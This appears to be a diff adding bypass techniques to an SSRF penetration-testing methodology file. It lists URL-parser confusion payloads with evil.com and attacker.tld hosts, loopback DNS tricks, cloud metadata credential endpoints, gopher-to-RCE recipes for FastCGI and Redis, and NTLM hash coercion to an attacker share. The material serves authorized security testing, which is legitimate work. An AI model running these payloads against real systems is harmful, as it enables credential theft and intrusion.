@@ -481,3 +481,67 @@ The SSRF vulnerability allows any authenticated user to force the web server to 
 - Server validates all outbound URLs against allowlist: confirmed not exploitable → rejected
 - SSRF to time.cloudflare.com or similar explicitly allowed external services: by design, not a vulnerability
 - Response shows the server attempted to fetch but was blocked (connection refused, DNS failure on internal addresses): indicates WAF/network controls — document and continue testing bypass techniques before giving up
+
+
+## Additional Techniques — ported from WebSkills (writeup-techniques/ssrf)
+
+Corpus-derived vectors and bypasses that go beyond the AWS-IMDS happy path already documented above. All additive — use alongside the existing methodology, OOB setup, and false-positive rules.
+
+### Parser-confusion host bypass (validator vs fetch-library divergence)
+Simple string checks "see" the trusted host; the URL parser connects elsewhere. Exploits backend validator (RFC 3986) vs fetch library (WHATWG/browser) divergence — also hits Node/PHP URL-parser mismatches.
+```
+https://trusted.tld@127.0.0.1/            userinfo — navigates to 127.0.0.1
+https://trusted.tld\@attacker.tld/        backslash trick (WHATWG vs RFC3986)
+https://evil.com[@127.0.0.1/              bracket — SSRF side (Spring vs Java URL mismatch)
+https://127.0.0.1[@evil.com               bracket — open-redirect side (Spring CVE-2024-22243)
+http://127.0.0.1#trusted.tld/   http://127.0.0.1%23@trusted.tld/   (fragment)
+http://127.0.0.1%2f%2f..%2f@trusted       satisfy a "must contain path" validator
+```
+
+### Wildcard-DNS → loopback (defeat "must be a subdomain of X" allow-lists)
+Public DNS names that resolve to 127.0.0.1 / internal, so they pass host-suffix allow-lists:
+```
+127.0.0.1.sslip.io   lvh.me   localtest.me   traefik.me   nip.io   xip.io
+localhost.   LOCALHOST   127.0.0.1.   (trailing dot / case-variation)
+```
+Also **enclosed-alphanumeric / "bubble-text"** Unicode look-alike digits that normalize to the IP after processing — used when a regex blocks ASCII digits.
+
+### AWS ECS / EKS container credentials (beyond EC2 IMDS)
+From inside a container you can often reach BOTH the container IAM role AND the EC2 role.
+```
+ECS:  http://169.254.170.2/v2/credentials/<GUID>
+      GUID = env AWS_CONTAINER_CREDENTIALS_RELATIVE_URI  (read via SSRF/LFI/path-traversal)
+EKS Pod Identity:  read AWS_CONTAINER_CREDENTIALS_FULL_URI + AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE
+      then GET the local credential endpoint with the projected SA token as Authorization header
+```
+
+### Cloud metadata nuances not to miss
+- **GCP beta path needs no header** (the standard path requires `Metadata-Flavor: Google`):
+  `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
+  Also add an SSH key: `.../computeMetadata/v1/project/attributes/ssh-keys`
+- **Azure managed identity** — select a specific MI with `client_id` / `object_id` / `msi_res_id`:
+  `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` (header `Metadata: true`)
+- **OpenStack**: `http://169.254.169.254/openstack`
+
+### Gopher → raw-TCP RCE breadth (beyond Redis/SMTP)
+`gopher://` sends arbitrary bytes to any TCP port; CRLF must be double-encoded (`%0d%0a`→`%250d%250a` inside the fetched URL). Generate with **Gopherus** (`--exploit fastcgi|redis|mysql|smtp|mongodb`), **SSRFmap**, or `remote-method-guesser --ssrf --gopher` (Java RMI).
+- **FastCGI (PHP-FPM :9000 RCE):** craft a FastCGI record setting `SCRIPT_FILENAME` + `PHP_VALUE` (`auto_prepend_file php://input`, `allow_url_include`) → code exec.
+- **uWSGI magic vars:** raw uwsgi protocol on the internal socket → inject `UWSGI_FILE` to load/execute an attacker WSGI app.
+- **MongoDB / Java RMI** command injection over gopher; Redis `CONFIG SET dir`+`dbfilename`+`SAVE` or `SLAVEOF` module-load → webshell/cron/SSH-key.
+
+### TLS-layer SSRF (fires before HTTP logic)
+- **SNI SSRF** — when Nginx uses `$ssl_preread_server_name` / SNI as `proxy_pass` target, set the SNI to an internal host:
+  `openssl s_client -connect target:443 -servername 127.0.0.1`
+- **AIA CA-Issuers SSRF (Java mTLS)** — Java with AIA fetching auto-downloads the CA-Issuers URI from a *client* certificate during the handshake. Present a client cert whose AIA points at an internal/collab URL → SSRF during cert validation; `file://` AIA → DoS (unbounded read).
+
+### CSS pre-processor SSRF (LESS / SCSS)
+Attacker-controlled `@import (inline) "http://169.254.169.254/…"` fetches remote/`file://` resources; a marker URI eases exfil of the fetched content into the compiled CSS. (SugarCRM ≤14.0.0.)
+
+### SSRF → NTLM hash leak (Windows)
+Coerce `file://` / UNC (`\\attacker\share`) → NTLM negotiation leaks the server-account hash (e.g. DNN CVE-2025-52488). Capture with Responder.
+
+### Tooling add-ons
+`Gopherus`, `SSRFmap`, `Singularity of Origin` (DNS-rebind: authoritative DNS + HTTP + ready payloads; used to beat BentoML's 2025 "safe URL" patch), `Burp-Encode-IP` (auto IP re-encodings), `Collaborator Everywhere` (finds header-driven SSRF via `Referer`/analytics), `recollapse` (regex-evasion fuzz), PortSwigger **URL-validation-bypass cheat sheet**, `Pacu` (AWS post-ex once creds land).
+
+### Provenance to cite (impact framing)
+Dropbox "Full Response SSRF via Google Drive" $17,576 · GitLab "SSRF via remote_attachment_url on a Note" $10,000 · Vimeo GCP SSH-key exfil $5,000 · Shopify "SSRF in Exchange → ROOT on all instances" · IBB libuv $4,860 · Keycloak `request_uri` unauth blind SSRF (EDB-50405). Lead with the highest proven pivot: cloud-cred theft > internal admin/API read > port scan > blind OOB.
